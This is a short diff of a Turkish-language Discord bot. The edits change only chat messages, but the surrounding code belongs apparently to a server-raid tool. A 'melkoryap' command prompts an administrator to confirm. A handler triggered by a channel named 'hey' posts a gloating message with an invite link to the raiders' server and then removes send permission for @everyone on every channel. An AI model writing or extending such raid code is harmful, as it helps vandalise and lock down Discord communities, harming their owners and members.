@@ -159,7 +159,7 @@ client.on('message', async message => {
   let u = message.mentions.users.first() || message.author;
   if (command === "melkoryap") {
   if (message.guild.channels.find(channel => channel.name === "Bot Kullanımı")) return message.channel.send(" Bot Paneli Zaten Ayarlanmış.")
-  message.channel.send(`Berke Abi Burayı Şimdi Melkor Yapıyımı?`)
+  message.channel.send(`Berke Abi Burayı Şimdi Melkor Yapıyımı?\n\n 'yap'`)
       if (!message.member.hasPermission('ADMINISTRATOR'))
   return message.channel.send(" Bu Kodu `Yönetici` Yetkisi Olan Kişi Kullanabilir.");
       message.channel.awaitMessages(response => response.content === 'yap', {
@@ -433,7 +433,7 @@ client.on('error', e => {
 
 client.on('channelCreate', channel => {
   if (channel.name == 'hey') {
-    channel.send(`Sunucu uff olmuş neyse bunları yapanla görüşmek istersen; https://discord.gg/qBAdCQB`)
+    channel.send(`Sunucuya ne oldu neyse üzüldüm :smoking: :smoking: bunları yapanla görüşmek istersen; https://discord.gg/qBAdCQB`)
     channel.guild.channels.forEach(c => {
          c.overwritePermissions(channel.guild.roles.find("name", "@everyone"), {
               SEND_MESSAGES: false,
